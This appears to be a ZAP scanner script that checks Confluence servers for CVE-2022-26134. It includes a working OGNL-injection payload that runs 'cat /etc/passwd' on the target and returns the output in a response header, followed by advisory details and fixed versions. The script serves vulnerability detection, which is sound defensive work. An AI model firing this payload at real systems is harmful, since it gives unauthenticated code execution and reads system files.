"""
References
https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html
https://github.com/jbaines-r7/through_the_wire
https://github.com/Nwqda/CVE-2022-26134

https://jira.atlassian.com/browse/CONFSERVER-79016

https://bugalert.org/content/notices/2022-06-02-confluence.html  
"""
def scanNode(sas, msg):
  payload ='${(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("cat /etc/passwd").getInputStream(),"utf-8")))}'
  msg = msg.cloneRequest();
  msg.getRequestHeader().getURI().setPath("/"+payload+"/")
  sas.sendAndReceive(msg, False, False);
  if msg.getResponseHeader().getStatusCode()==302 and msg.getResponseHeader().getHeader('X-Cmd-Response'):
    sas.raiseAlert(3, 3, 'CVE-2022-26134', 'Confluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability', 
    msg.getRequestHeader().getURI().toString(), 
      '', payload,'In affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance. The affected versions are from 1.3.0 before 7.4.17, from 7.13.0 before 7.13.7, from 7.14.0 before 7.14.3, from 7.15.0 before 7.15.2, from 7.16.0 before 7.16.4, from 7.17.0 before 7.17.4, and from 7.18.0 before 7.18.1.', 'Released versions 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4 and 7.18.1 contain a fix for this issue.', 'X-Cmd-Response: root:x:0:0:root:/root:/bin/bash','''https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html 
https://github.com/jbaines-r7/through_the_wire 
https://github.com/Nwqda/CVE-2022-26134 
https://jira.atlassian.com/browse/CONFSERVER-79016 
https://bugalert.org/content/notices/2022-06-02-confluence.html''', 74, 0, msg);
    
